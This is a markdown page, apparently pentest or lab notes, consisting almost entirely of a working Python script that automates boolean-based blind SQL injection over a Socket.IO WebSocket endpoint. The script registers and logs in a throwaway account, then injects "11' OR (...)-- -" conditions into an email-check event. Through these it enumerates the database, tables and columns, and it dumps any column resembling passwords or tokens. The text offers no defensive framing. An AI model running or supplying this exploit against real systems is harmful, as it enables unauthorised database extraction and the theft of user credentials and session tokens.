# WebSocket SQLi

## MySQL Injection

```python
import socketio
import time, random, string
from threading import Event

# =============================
# CONFIG – YOU MUST ADAPT THESE
# =============================

TARGET = "http://[TARGET]"
# NAMESPACE = "/"                 # usually "/"
CHECK_EVENT = "checkEmail"      # event that triggers SQLi

# Generate random user for each run
def random_email():
    return "user_" + "".join(random.choices(string.ascii_lowercase, k=6)) + "@test.com"

EMAIL = random_email()
PASSWORD = "Password123!"
login_token = None

# This is where you adapt the injection point
# Example later:
#   "11' OR ({condition})-- -"
INJECTION_TEMPLATE = "11' OR ({})-- -"

# =============================
# GLOBAL STATE
# =============================

sio = socketio.Client()

oracle_event = Event()
oracle_result = None
login_token = None

# =============================
# SOCKET HANDLERS
# =============================

@sio.event
def connect():
    print("[+] Connected to Socket.IO")
    # Start with registration
    register_payload = {
        "firstName": "Test",
        "lastName": "User",
        "email": EMAIL,
        "password1": PASSWORD,
        "password2": PASSWORD
    }

    print("[*] Registering user:", EMAIL)
    sio.emit("postRegister", register_payload)
    time.sleep(1)

    login_payload = {
        "email": EMAIL,
        "password": PASSWORD
    }

    print("[*] Logging in as:", EMAIL)
    sio.emit("postLogin", login_payload)

@sio.event
def disconnect():
    print("[-] Disconnected")

# ---- LOGIN SUCCESS HANDLER (YOU ALREADY HAVE THIS PART) ----

@sio.on("user")     # adapt if your app uses a different event
def on_user(data):
    global login_token

    print("[+] Login successful")
    login_token = data.get("token")

    if not login_token:
        print("[-] No token received, aborting")
        sio.disconnect()
        return

    print("[+] Extracted token:", login_token)

    # Start blind SQLi automation after login
    time.sleep(1)

    run_extraction()


# ---- BOOLEAN ORACLE RESPONSE ---- TRUE/FALSE

@sio.on("emailFound")
def on_oracle_response(data):
    global oracle_result
    # data should be True / False
    oracle_result = bool(data)
    oracle_event.set()

# =============================
# CORE ORACLE FUNCTION
# =============================

def boolean_oracle(condition):
    """
    Ask a YES/NO SQL question and return True / False
    """
    global oracle_result

    oracle_event.clear()

    payload = {
        "token": login_token,
        "email": INJECTION_TEMPLATE.format(condition)
    }

    sio.emit(CHECK_EVENT, payload)

    oracle_event.wait(timeout=5)

    return oracle_result

# =============================
# BLIND EXTRACTION PRIMITIVES
# =============================

def get_length(expr, max_len=100):
    for i in range(1, max_len + 1):
        cond = f"LENGTH({expr})={i}"
        if boolean_oracle(cond):
            print(f"\r[+] Length({expr}) = {i}", end="", flush=True)
            return i
    return None


def get_char(expr, pos):
    for c in range(32, 127):
        cond = f"ASCII(SUBSTRING({expr},{pos},1))={c}"
        if boolean_oracle(cond):
            return chr(c)
    return None


def dump_string(expr, max_len=100):
    length = get_length(expr, max_len)
    # print("\r")
    if not length:
        return ""

    out = ""
    for i in range(1, length + 1):
        ch = get_char(expr, i)
        if not ch:
            break
        out += ch
        print(f"\r[+] {expr}[{i}] = {ch}  →  {out}", end="", flush=True)

    print(f"\n[+] Final value: {out}")
    return out

# =============================
# SCHEMA ENUMERATION HELPERS
# =============================

def get_table_name(index):
    expr = f"(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {index},1)"
    return dump_string(expr, max_len=64)


def dump_tables(max_tables=50):
    tables = []
    print("[*] Enumerating tables...")

    for i in range(max_tables):
        name = get_table_name(i)
        if not name:
            break
        print(f"[+] Table {i}: {name}")
        tables.append(name)

    return tables


def get_column_name(table, index):
    expr = (
        f"(SELECT column_name FROM information_schema.columns "
        f"WHERE table_name='{table}' LIMIT {index},1)"
    )
    return dump_string(expr, max_len=64)


def dump_columns(table, max_cols=50):
    cols = []
    print(f"[*] Enumerating columns for table: {table}")

    for i in range(max_cols):
        name = get_column_name(table, i)
        if not name:
            break
        print(f"[+] Column {i}: {name}")
        cols.append(name)

    return cols


def get_cell(table, column, row):
    expr = f"(SELECT {column} FROM {table} LIMIT {row},1)"
    return dump_string(expr, max_len=128)


def dump_column(table, column, max_rows=20):
    values = []
    print(f"[*] Dumping {table}.{column}")

    for i in range(max_rows):
        val = get_cell(table, column, i)
        if not val:
            break
        print(f"[+] Row {i}: {val}")
        values.append(val)

    return values

# =============================
# MAIN EXTRACTION LOGIC
# =============================

def run_extraction():
    print("[*] Starting blind SQLi enumeration")

    # 1. Dump database name
    db = dump_string("database()", max_len=32)
    print("[+] Database:", db)

    # 2. Dump tables
    tables = dump_tables()

    # 3. Look for interesting tables automatically
    for table in tables:
        if "auth" in table.lower() or "token" in table.lower() or "user" in table.lower():
            print(f"[!] Interesting table found: {table}")

            cols = dump_columns(table)

            for col in cols:
                if "token" in col.lower() or "pass" in col.lower():
                    print(f"[!] Dumping sensitive column: {table}.{col}")
                    dump_column(table, col)

    print("[+] Extraction finished")
    sio.disconnect()

# =============================
# CONNECTION / LOGIN BOOTSTRAP
# =============================

def main():
    print("[*] Connecting to target...")
    # sio.connect(TARGET, namespaces=[NAMESPACE])
    sio.connect(TARGET, transports=["websocket"])
    sio.wait()

if __name__ == "__main__":
    main()
```
